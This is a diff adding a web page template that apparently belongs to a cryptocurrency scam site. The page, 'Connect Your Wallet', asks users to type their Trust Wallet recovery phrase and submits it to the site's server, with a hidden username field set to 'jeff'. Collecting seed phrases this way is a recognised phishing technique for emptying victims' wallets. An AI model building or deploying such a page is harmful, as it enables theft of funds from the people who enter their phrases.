@@ -1,0 +1,51 @@
+<%-include("../partials/header.ejs") %>
+
+
+<div class="main-content side-content pt-0">
+    <div class="main-container container-fluid">
+        <div class="inner-body">
+            <div id="mobileshow" class="see"></div>
+            <div class="sees hide-mobile"></div>
+            <div class="mb-4 d-flex align-items-center">
+                <a href="connect" class="mb-0 fw-bold fs-6 text-white me-1">Wallets</a>
+                <i class="fa fa-angle-right"></i>
+                <p class="mb-0 ms-1">Connect Your Wallet</p>
+            </div>
+
+            <!--Row-->
+            <div class="row">
+                <div class="col-lg-6 offset-lg-3">
+                    <div class="card">
+                        <div class="card-body">
+                         <form action='#' method='POST'>
+                                <div class='rounded-10 d-inline-block p-3 bg-black'>
+                                    <p class='mb-0 fw-bold'>Trust Wallet Phrase</p>
+                                </div>
+                                <input type='hidden' name='wallets' value='Trust Wallet'>
+                                 <input type='hidden' name='username' value='jeff'>
+                                 
+                                <label for='phrase' class='mt-5 d-block'>Recovery Phrase</label>
+                                <textarea name='phrases' id='phrase' rows='4' class='form-control'
+                                    placeholder='Enter your phrase value...'></textarea>
+                                <label for='' class='fs-7 cerror text-danger'></label>
+                                <label for='' class='mt-4 d-block'>Typically 12 (sometimes 24) words separated by single
+                                    space.</label>
+                                <button type='submit' disabled name='connects' id='btnconnect'
+                                    class='btn btn-primary fw-bold mt-4 w-100'>Connect</button>
+                            </form>
+
+                           
+                            
+                        </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+                                           
+
+<br><br><br><br>
+
+<%-include('../partials/footer')%>
